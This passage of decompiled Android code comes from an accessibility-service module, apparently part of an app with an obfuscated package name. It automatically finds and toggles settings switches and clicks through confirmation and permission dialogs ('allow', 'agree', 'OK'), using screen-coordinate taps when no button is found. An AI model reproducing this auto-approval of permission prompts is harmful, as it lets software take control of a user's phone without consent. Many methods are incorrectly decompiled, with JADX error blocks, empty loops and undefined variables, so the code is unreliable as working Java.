                miuiSteps$findAndClickAnySwitch$1.f54415a8 = i2 - Integer.MIN_VALUE;
            } else {
                miuiSteps$findAndClickAnySwitch$1 = new MiuiSteps$findAndClickAnySwitch$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$findAndClickAnySwitch$1.f54413a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = miuiSteps$findAndClickAnySwitch$1.f54415a8;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            m212274d8("[查找开关] 开始...");
            c0367a4 = this;
            i = 1;
            if (i >= 4) {
            }
        } else {
            if (i3 == 1) {
                f2 = miuiSteps$findAndClickAnySwitch$1.f54411a4;
                f = miuiSteps$findAndClickAnySwitch$1.f54410a3;
                accessibilityNodeInfo2 = miuiSteps$findAndClickAnySwitch$1.f54409a2;
                accessibilityNodeInfo = miuiSteps$findAndClickAnySwitch$1.f54408a1;
                c0367a42 = miuiSteps$findAndClickAnySwitch$1.f54407a0;
                kg1.m213544f4(obj);
                c0367a42.m212274d8(AbstractC0003a2.m29b0("[查找开关] 坐标点击: (", f, ", ", f2, ")"));
                c0367a42.m212277e2(f, f2, 100L);
                accessibilityNodeInfo2.recycle();
                accessibilityNodeInfo.recycle();
                return Boolean.TRUE;
            }
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = miuiSteps$findAndClickAnySwitch$1.f54412a5;
            c0367a4 = miuiSteps$findAndClickAnySwitch$1.f54407a0;
            kg1.m213544f4(obj);
            i++;
            if (i >= 4) {
                c0367a4.m212274d8("[查找开关] ❌ 未找到任何开关");
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0367a4.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212245d0 = m212245d0(rootInActiveWindow);
                if (accessibilityNodeInfoM212245d0 == null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM212241c3 = m212241c3(rootInActiveWindow);
                    if (accessibilityNodeInfoM212241c3 != null) {
                        c0367a4.m212274d8("[查找开关] ✅ 开关已开启");
                        accessibilityNodeInfoM212241c3.recycle();
                        rootInActiveWindow.recycle();
                        return Boolean.TRUE;
                    }
                    rootInActiveWindow.recycle();
                    miuiSteps$findAndClickAnySwitch$1.f54407a0 = c0367a4;
                    miuiSteps$findAndClickAnySwitch$1.f54412a5 = i;
                    miuiSteps$findAndClickAnySwitch$1.f54415a8 = 2;
                } else {
                    c0367a4.m212274d8("[查找开关] ✅ 找到未选中开关");
                    Rect rect = new Rect();
                    accessibilityNodeInfoM212245d0.getBoundsInScreen(rect);
                    float fCenterX = rect.centerX();
                    float fCenterY = rect.centerY();
                    c0367a4.m212274d8("[查找开关] ACTION_CLICK: " + accessibilityNodeInfoM212245d0.performAction(16));
                    miuiSteps$findAndClickAnySwitch$1.f54407a0 = c0367a4;
                    miuiSteps$findAndClickAnySwitch$1.f54408a1 = rootInActiveWindow;
                    miuiSteps$findAndClickAnySwitch$1.f54409a2 = accessibilityNodeInfoM212245d0;
                    miuiSteps$findAndClickAnySwitch$1.f54410a3 = fCenterX;
                    miuiSteps$findAndClickAnySwitch$1.f54411a4 = fCenterY;
                    miuiSteps$findAndClickAnySwitch$1.f54415a8 = 1;
                    if (b81.m210571b1(50L, miuiSteps$findAndClickAnySwitch$1) != coroutineSingletons) {
                        accessibilityNodeInfo = rootInActiveWindow;
                        f2 = fCenterY;
                        f = fCenterX;
                        c0367a42 = c0367a4;
                        accessibilityNodeInfo2 = accessibilityNodeInfoM212245d0;
                        c0367a42.m212274d8(AbstractC0003a2.m29b0("[查找开关] 坐标点击: (", f, ", ", f2, ")"));
                        c0367a42.m212277e2(f, f2, 100L);
                        accessibilityNodeInfo2.recycle();
                        accessibilityNodeInfo.recycle();
                        return Boolean.TRUE;
                    }
                }
                return coroutineSingletons;
            }
            i++;
            if (i >= 4) {
            }
        }
    }

    /* renamed from: c2 */
    public final Boolean m212263c2(String str) throws InterruptedException {
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        String string2;
        String string3;
        String string4;
        try {
            rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
        } catch (Exception unused) {
            rootInActiveWindow = null;
        }
        if (rootInActiveWindow == null) {
            return Boolean.FALSE;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
        if (listFindAccessibilityNodeInfosByText == null) {
            return Boolean.FALSE;
        }
        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
            if (accessibilityNodeInfo.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo.getText();
                String str2 = "";
                if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                    string = "";
                }
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                    str2 = string3;
                }
                if (string.equals(str) || AbstractC0779a1.m213679d2(string, false, str) || str2.equals(str)) {
                    if (accessibilityNodeInfo.isClickable()) {
                        m212274d8("│ │ │ │   [点击] " + str + " → 节点可点击");
                        accessibilityNodeInfo.performAction(16);
                        return Boolean.TRUE;
                    }
                    AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                    if (parent != null && parent.isClickable()) {
                        m212274d8("│ │ │ │   [点击] " + str + " → 父节点可点击");
                        parent.performAction(16);
                        return Boolean.TRUE;
                    }
                    Rect rect = new Rect();
                    if (parent != null) {
                        accessibilityNodeInfo = parent;
                    }
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    float fWidth = rect.right - (rect.width() * 0.15f);
                    float fCenterY = rect.centerY();
                    m212274d8("│ │ │ │   [点击] " + str + " → 行右侧坐标 (" + fWidth + ", " + fCenterY + ")");
                    m212277e2(fWidth, fCenterY, 50L);
                    return Boolean.TRUE;
                }
            }
        }
        return Boolean.FALSE;
    }

    /* renamed from: c6 */
    public final AccessibilityNodeInfo m212264c6(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        AccessibilityNodeInfo parent;
        AccessibilityNodeInfo child;
        AccessibilityNodeInfo child2;
        AccessibilityNodeInfo child3;
        try {
            parent = accessibilityNodeInfo.getParent();
        } catch (Exception unused) {
            parent = null;
        }
        if (parent != null) {
            int childCount = parent.getChildCount();
            for (int i = 0; i < childCount; i++) {
                try {
                    child = parent.getChild(i);
                } catch (Exception unused2) {
                    child = null;
                }
                if (child != null) {
                    if (m212244c7(this, str, child)) {
                        m212274d8("│ │   [开关搜索] 第1层找到: " + ((Object) child.getClassName()));
                        return child;
                    }
                    int childCount2 = child.getChildCount();
                    for (int i2 = 0; i2 < childCount2; i2++) {
                        try {
                            child2 = child.getChild(i2);
                        } catch (Exception unused3) {
                            child2 = null;
                        }
                        if (child2 != null) {
                            if (m212244c7(this, str, child2)) {
                                m212274d8("│ │   [开关搜索] 第2层找到: " + ((Object) child2.getClassName()));
                                return child2;
                            }
                            int childCount3 = child2.getChildCount();
                            for (int i3 = 0; i3 < childCount3; i3++) {
                                try {
                                    child3 = child2.getChild(i3);
                                } catch (Exception unused4) {
                                    child3 = null;
                                }
                                if (child3 != null && m212244c7(this, str, child3)) {
                                    m212274d8("│ │   [开关搜索] 第3层找到: " + ((Object) child3.getClassName()));
                                    return child3;
                                }
                            }
                        }
                    }
                }
            }
        }
        return null;
    }

    /*  JADX ERROR: JadxRuntimeException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxRuntimeException: Can't find top splitter block for handler:B:11:0x0012
        	at jadx.core.utils.BlockUtils.getTopSplitterForHandler(BlockUtils.java:1178)
        	at jadx.core.dex.visitors.regions.maker.ExcHandlersRegionMaker.collectHandlerRegions(ExcHandlersRegionMaker.java:53)
        	at jadx.core.dex.visitors.regions.maker.ExcHandlersRegionMaker.process(ExcHandlersRegionMaker.java:38)
        	at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:27)
        */
    /* renamed from: c8 */
    public final android.view.accessibility.AccessibilityNodeInfo m212265c8(android.view.accessibility.AccessibilityNodeInfo r5, java.lang.String r6) {
        /*
            r4 = this;
            java.lang.String r0 = "android.widget.CheckBox"
            if (r6 != 0) goto L5
            r6 = r0
        L5:
            android.view.accessibility.AccessibilityNodeInfo r1 = r4.m212264c6(r5, r6)
            if (r1 == 0) goto Lc
            return r1
        Lc:
            r1 = 0
            android.view.accessibility.AccessibilityNodeInfo r2 = r5.getParent()     // Catch: java.lang.Exception -> L12
            goto L13
        L12:
            r2 = r1
        L13:
            if (r2 == 0) goto L21
            android.view.accessibility.AccessibilityNodeInfo r3 = r4.m212264c6(r2, r6)
            if (r3 == 0) goto L1c
            return r3
        L1c:
            android.view.accessibility.AccessibilityNodeInfo r2 = r2.getParent()     // Catch: java.lang.Exception -> L12
            goto L13
        L21:
            boolean r6 = r6.equals(r0)
            if (r6 == 0) goto L2e
            java.lang.String r6 = "android.widget.Switch"
            android.view.accessibility.AccessibilityNodeInfo r5 = r4.m212265c8(r5, r6)
            return r5
        L2e:
            return r1
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.modules.yw5xud.C0367a4.m212265c8(android.view.accessibility.AccessibilityNodeInfo, java.lang.String):android.view.accessibility.AccessibilityNodeInfo");
    }

    /* renamed from: c9 */
    public final AccessibilityNodeInfo m212266c9(String str) {
        AccessibilityNodeInfo rootInActiveWindow;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        String string;
        try {
            rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
        } catch (Exception unused) {
            rootInActiveWindow = null;
        }
        if (rootInActiveWindow != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str)) != null) {
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                CharSequence text = accessibilityNodeInfo.getText();
                String string2 = text != null ? text.toString() : null;
                CharSequence className = accessibilityNodeInfo.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if (string2 != null && (string2.equals(str) || AbstractC0779a1.m213679d2(string2, false, str))) {
                    if (!AbstractC0779a1.m213655a8(string, false, ".AutoCompleteTextView")) {
                        return accessibilityNodeInfo;
                    }
                }
            }
        }
        return null;
    }

    /* renamed from: d1 */
    public final String m212267d1() throws PackageManager.NameNotFoundException {
        Context context = this.f55107a1;
        try {
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
            t60.m214694b5(applicationInfo, "pm.getApplicationInfo(context.packageName, 0)");
            return packageManager.getApplicationLabel(applicationInfo).toString();
        } catch (Exception unused) {
            String packageName = context.getPackageName();
            t60.m214694b5(packageName, "{\n            context.packageName\n        }");
            return packageName;
        }
    }

    /* renamed from: d2 */
    public final int m212268d2() {
        return this.f55107a1.getResources().getDisplayMetrics().heightPixels;
    }

    /* renamed from: d3 */
    public final int m212269d3() {
        return this.f55107a1.getResources().getDisplayMetrics().widthPixels;
    }

    /* JADX WARN: Removed duplicated region for block: B:31:0x0072 A[PHI: r3
      0x0072: PHI (r3v5 com.storm.safe.rock.service.modules.yw5xud.a4) = 
      (r3v2 com.storm.safe.rock.service.modules.yw5xud.a4)
      (r3v4 com.storm.safe.rock.service.modules.yw5xud.a4)
      (r3v8 com.storm.safe.rock.service.modules.yw5xud.a4)
     binds: [B:30:0x0071, B:28:0x006e, B:19:0x0043] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:33:0x007a  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x009e A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* renamed from: d4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212270d4(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$handleAndroidVersionSpecific$1 miuiSteps$handleAndroidVersionSpecific$1;
        C0367a4 c0367a4;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof MiuiSteps$handleAndroidVersionSpecific$1) {
            miuiSteps$handleAndroidVersionSpecific$1 = (MiuiSteps$handleAndroidVersionSpecific$1) continuationImpl;
            int i = miuiSteps$handleAndroidVersionSpecific$1.f54419a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$handleAndroidVersionSpecific$1 = new MiuiSteps$handleAndroidVersionSpecific$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$handleAndroidVersionSpecific$1.f54417a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$handleAndroidVersionSpecific$1.f54419a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            if (Build.VERSION.SDK_INT != 33) {
                c0367a4 = this;
                String str = Build.MODEL;
                while (i < r10) {
                }
            }
            miuiSteps$handleAndroidVersionSpecific$1.f54416a0 = this;
            miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = 1;
            if (b81.m210571b1(50L, miuiSteps$handleAndroidVersionSpecific$1) != coroutineSingletons) {
                c0367a4 = this;
                miuiSteps$handleAndroidVersionSpecific$1.f54416a0 = c0367a4;
                miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = 2;
                if (c0367a4.m212248a1("确定", 0.0f, miuiSteps$handleAndroidVersionSpecific$1) != coroutineSingletons) {
                }
            }
        }
        if (i2 == 1) {
            c0367a4 = miuiSteps$handleAndroidVersionSpecific$1.f54416a0;
            kg1.m213544f4(obj);
            miuiSteps$handleAndroidVersionSpecific$1.f54416a0 = c0367a4;
            miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = 2;
            if (c0367a4.m212248a1("确定", 0.0f, miuiSteps$handleAndroidVersionSpecific$1) != coroutineSingletons) {
                String str2 = Build.MODEL;
                while (i < r10) {
                }
            }
        }
        if (i2 != 2) {
            if (i2 != 3) {
                if (i2 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                return c1351vv;
            }
            c0367a4 = miuiSteps$handleAndroidVersionSpecific$1.f54416a0;
            kg1.m213544f4(obj);
            miuiSteps$handleAndroidVersionSpecific$1.f54416a0 = null;
            miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = 4;
            return c0367a4.m212248a1("允许", 0.0f, miuiSteps$handleAndroidVersionSpecific$1) != coroutineSingletons ? coroutineSingletons : c1351vv;
        }
        c0367a4 = miuiSteps$handleAndroidVersionSpecific$1.f54416a0;
        kg1.m213544f4(obj);
        String str22 = Build.MODEL;
        for (String str3 : f55094b3) {
            if (AbstractC0779a1.m213656a9(str22, str3)) {
                miuiSteps$handleAndroidVersionSpecific$1.f54416a0 = c0367a4;
                miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = 3;
                if (b81.m210571b1(50L, miuiSteps$handleAndroidVersionSpecific$1) != coroutineSingletons) {
                    miuiSteps$handleAndroidVersionSpecific$1.f54416a0 = null;
                    miuiSteps$handleAndroidVersionSpecific$1.f54419a3 = 4;
                    if (c0367a4.m212248a1("允许", 0.0f, miuiSteps$handleAndroidVersionSpecific$1) != coroutineSingletons) {
                    }
                }
            }
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(9:42|43|106|44|114|45|(4:48|(8:117|50|51|(1:61)|62|(1:69)|70|(5:120|74|102|75|(1:121)(2:92|125))(1:124))(1:123)|122|46)|118|93) */
    /* JADX WARN: Code restructure failed: missing block: B:116:0x01f1, code lost:
    
        r22 = r5;
        r5 = r7;
        r6 = r22;
        r16 = r9;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x00bb, code lost:
    
        if (p000.b81.m210571b1(r5, r1) == r3) goto L83;
     */
    /* JADX WARN: Code restructure failed: missing block: B:58:0x0152, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:59:0x0153, code lost:
    
        r5 = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x0154, code lost:
    
        r6 = 50;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:0x01a4, code lost:
    
        r15.m212274d8("│ │   [弹窗] ✅ 成功点击「" + r12 + "」按钮");
        r1.f54420a0 = r15;
        r1.f54421a1 = r14;
        r1.f54422a2 = r13;
        r1.f54423a3 = r12;
        r1.f54424a4 = r11;
        r1.f54425a5 = r10;
        r1.f54426a6 = r4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x01cb, code lost:
    
        r5 = 2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:79:0x01cc, code lost:
    
        r1.f54429a9 = 2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x01ce, code lost:
    
        r6 = 50;
     */
    /* JADX WARN: Code restructure failed: missing block: B:82:0x01d4, code lost:
    
        if (p000.b81.m210571b1(50, r1) != r3) goto L84;
     */
    /* JADX WARN: Code restructure failed: missing block: B:83:0x01d6, code lost:
    
        return r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:86:0x01da, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:88:0x01dc, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:94:0x01ea, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:95:0x01eb, code lost:
    
        r22 = r5;
        r5 = r7;
        r6 = r22;
     */
    /* JADX WARN: Removed duplicated region for block: B:100:0x0225  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x008d  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x00c9  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00d7  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00e4  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:98:0x0217  */
    /* JADX WARN: Type inference failed for: r8v0 */
    /* JADX WARN: Type inference failed for: r8v2, types: [android.view.accessibility.AccessibilityNodeInfo, java.lang.String, java.util.Iterator] */
    /* JADX WARN: Type inference failed for: r8v4 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:108:0x01d0 -> B:86:0x01da). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:16:0x004a -> B:97:0x01f9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:31:0x00c9 -> B:32:0x00ce). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:33:0x00d7 -> B:34:0x00de). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:60:0x0154 -> B:97:0x01f9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:82:0x01d4 -> B:84:0x01d7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:93:0x01e6 -> B:96:0x01f1). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:95:0x01eb -> B:97:0x01f9). Please report as a decompilation issue!!! */
    /* renamed from: d5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212271d5(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$handleConfirmPopupDialog$1 miuiSteps$handleConfirmPopupDialog$1;
        C0367a4 c0367a4;
        int i;
        int i2;
        List listM213306g5;
        C0367a4 c0367a42;
        C0367a4 c0367a43;
        List list;
        Iterator it;
        String str;
        AccessibilityNodeInfo accessibilityNodeInfo;
        char c;
        long j;
        int i3;
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        String string2;
        String string3;
        String string4;
        if (continuationImpl instanceof MiuiSteps$handleConfirmPopupDialog$1) {
            miuiSteps$handleConfirmPopupDialog$1 = (MiuiSteps$handleConfirmPopupDialog$1) continuationImpl;
            int i4 = miuiSteps$handleConfirmPopupDialog$1.f54429a9;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                miuiSteps$handleConfirmPopupDialog$1.f54429a9 = i4 - Integer.MIN_VALUE;
                c0367a4 = this;
            } else {
                c0367a4 = this;
                miuiSteps$handleConfirmPopupDialog$1 = new MiuiSteps$handleConfirmPopupDialog$1(c0367a4, continuationImpl);
            }
        }
        Object obj = miuiSteps$handleConfirmPopupDialog$1.f54427a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = miuiSteps$handleConfirmPopupDialog$1.f54429a9;
        long j2 = 50;
        char c2 = 2;
        ?? r8 = 0;
        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        int i6 = 1;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            i = 3;
            i2 = 0;
            listM213306g5 = AbstractC0716jf.m213306g5("确定", "知道了", "允许", "确认", "同意", "开启", "好的", "是", "立即开始");
            c0367a42 = c0367a4;
            if (i2 < i) {
            }
        } else {
            if (i5 != 1) {
                if (i5 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i2 = miuiSteps$handleConfirmPopupDialog$1.f54426a6;
                i = miuiSteps$handleConfirmPopupDialog$1.f54425a5;
                accessibilityNodeInfo = miuiSteps$handleConfirmPopupDialog$1.f54424a4;
                str = miuiSteps$handleConfirmPopupDialog$1.f54423a3;
                it = miuiSteps$handleConfirmPopupDialog$1.f54422a2;
                list = miuiSteps$handleConfirmPopupDialog$1.f54421a1;
                c0367a43 = miuiSteps$handleConfirmPopupDialog$1.f54420a0;
                try {
                    kg1.m213544f4(obj);
                    c = 2;
                    j = 50;
                    i3 = 1;
                } catch (Exception e) {
                    e = e;
                    long j3 = j2;
                    c = c2;
                    j = j3;
                    i3 = i6;
                    c0367a43.m212274d8("│ │   [弹窗] ⚠️ 搜索「" + str + "」异常: " + e.getMessage());
                    c2 = c;
                    j2 = j;
                    i6 = i3;
                    if (it.hasNext()) {
                    }
                }
                return Boolean.TRUE;
            }
            i2 = miuiSteps$handleConfirmPopupDialog$1.f54426a6;
            i = miuiSteps$handleConfirmPopupDialog$1.f54425a5;
            listM213306g5 = miuiSteps$handleConfirmPopupDialog$1.f54421a1;
            c0367a42 = miuiSteps$handleConfirmPopupDialog$1.f54420a0;
            kg1.m213544f4(obj);
            try {
            } catch (Exception unused) {
                rootInActiveWindow = accessibilityNodeInfo2;
            }
            rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                c0367a42.m212274d8("│ │   [弹窗] ⚠️ 获取根节点失败");
                i2++;
                c2 = c2;
                j2 = j2;
                i6 = i6;
                r8 = 0;
                if (i2 < i) {
                    c0367a42.m212274d8("│ │   [弹窗] 第" + (i2 + 1) + "次尝试查找确认按钮...");
                    accessibilityNodeInfo2 = r8;
                    if (i2 > 0) {
                        miuiSteps$handleConfirmPopupDialog$1.f54420a0 = c0367a42;
                        miuiSteps$handleConfirmPopupDialog$1.f54421a1 = listM213306g5;
                        miuiSteps$handleConfirmPopupDialog$1.f54422a2 = r8;
                        miuiSteps$handleConfirmPopupDialog$1.f54423a3 = r8;
                        miuiSteps$handleConfirmPopupDialog$1.f54424a4 = r8;
                        miuiSteps$handleConfirmPopupDialog$1.f54425a5 = i;
                        miuiSteps$handleConfirmPopupDialog$1.f54426a6 = i2;
                        miuiSteps$handleConfirmPopupDialog$1.f54429a9 = i6;
                        accessibilityNodeInfo2 = r8;
                    }
                    rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        it = listM213306g5.iterator();
                        list = listM213306g5;
                        c0367a43 = c0367a42;
                        accessibilityNodeInfo = rootInActiveWindow;
                        if (it.hasNext()) {
                            str = (String) it.next();
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
                            if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                                long j4 = j2;
                                c = c2;
                                j = j4;
                                i3 = i6;
                            } else {
                                int size = listFindAccessibilityNodeInfosByText.size();
                                i3 = i6;
                                StringBuilder sb = new StringBuilder();
                                sb.append("│ │   [弹窗] 找到 ");
                                sb.append(size);
                                sb.append(" 个「");
                                sb.append(str);
                                sb.append("」节点");
                                c0367a43.m212274d8(sb.toString());
                                for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText) {
                                    if (accessibilityNodeInfo3 != null) {
                                        CharSequence text = accessibilityNodeInfo3.getText();
                                        String str2 = "";
                                        if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                                            string = "";
                                        }
                                        CharSequence contentDescription = accessibilityNodeInfo3.getContentDescription();
                                        if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                                            str2 = string3;
                                        }
                                        if (string.equals(str) || str2.equals(str)) {
                                            StringBuilder sb2 = new StringBuilder();
                                            try {
                                            } catch (Exception e2) {
                                                e = e2;
                                                c = 2;
                                            }
                                            sb2.append("│ │   [弹窗] ✓ 精确匹配: text='");
                                            sb2.append(string);
                                            sb2.append("', desc='");
                                            sb2.append(str2);
                                            sb2.append("'");
                                            c0367a43.m212274d8(sb2.toString());
                                            if (c0367a43.m212289f4(accessibilityNodeInfo3)) {
                                                break;
                                            }
                                            c2 = 2;
                                        }
                                    }
                                }
                                c = c2;
                                j = 50;
                            }
                            c2 = c;
                            j2 = j;
                            i6 = i3;
                            if (it.hasNext()) {
                                listM213306g5 = list;
                                c0367a42 = c0367a43;
                                i2++;
                                c2 = c2;
                                j2 = j2;
                                i6 = i6;
                                r8 = 0;
                                if (i2 < i) {
                                    c0367a42.m212274d8("│ │   [弹窗] 尝试坐标点击备用方案...");
                                    DisplayMetrics displayMetrics = c0367a42.f55107a1.getResources().getDisplayMetrics();
                                    int i7 = displayMetrics.widthPixels;
                                    int i8 = displayMetrics.heightPixels;
                                    float f = i7 * 0.65f;
                                    float f2 = i8 * 0.55f;
                                    c0367a42.m212274d8("│ │   [弹窗坐标] 屏幕=" + i7 + "x" + i8);
                                    c0367a42.m212274d8(AbstractC0003a2.m29b0("│ │   [弹窗坐标] 🎯 点击: (", f, ", ", f2, ")"));
                                    c0367a42.m212277e2(f, f2, 100L);
                                    return Boolean.TRUE;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x003c  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x0055  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:20:0x004f -> B:21:0x0052). Please report as a decompilation issue!!! */
    /* renamed from: d6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212272d6(long j, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$interruptibleDelay$1 miuiSteps$interruptibleDelay$1;
        if (continuationImpl instanceof MiuiSteps$interruptibleDelay$1) {
            miuiSteps$interruptibleDelay$1 = (MiuiSteps$interruptibleDelay$1) continuationImpl;
            int i = miuiSteps$interruptibleDelay$1.f54434a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$interruptibleDelay$1.f54434a4 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$interruptibleDelay$1 = new MiuiSteps$interruptibleDelay$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$interruptibleDelay$1.f54432a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$interruptibleDelay$1.f54434a4;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            if (j > 0) {
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j2 = miuiSteps$interruptibleDelay$1.f54431a1;
            long j3 = miuiSteps$interruptibleDelay$1.f54430a0;
            kg1.m213544f4(obj);
            j = j3 - j2;
            if (j > 0) {
                long jMin = Math.min(j, 100L);
                miuiSteps$interruptibleDelay$1.f54430a0 = j;
                miuiSteps$interruptibleDelay$1.f54431a1 = jMin;
                miuiSteps$interruptibleDelay$1.f54434a4 = 1;
                if (b81.m210571b1(jMin, miuiSteps$interruptibleDelay$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                j3 = j;
                j2 = jMin;
                j = j3 - j2;
                if (j > 0) {
                    return C1351vv.f60710b1;
                }
            }
        }
    }

    /* renamed from: d7 */
    public final boolean m212273d7() {
        String string;
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                m212274d8("│ 🔍 无法获取根节点，判断为不在应用");
                return false;
            }
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "";
            }
            try {
                rootInActiveWindow.recycle();
            } catch (Exception unused) {
            }
            boolean zEquals = string.equals(this.f55107a1.getPackageName());
            m212274d8("│ 🔍 当前页面包名: " + string + ", 是否为我们应用: " + zEquals);
            return zEquals;
        } catch (Exception e) {
            AbstractC0003a2.m45c6("│ ❌ 检测当前应用失败: ", e.getMessage(), this);
            return false;
        }
    }

    /* renamed from: d8 */
    public final void m212274d8(String str) {
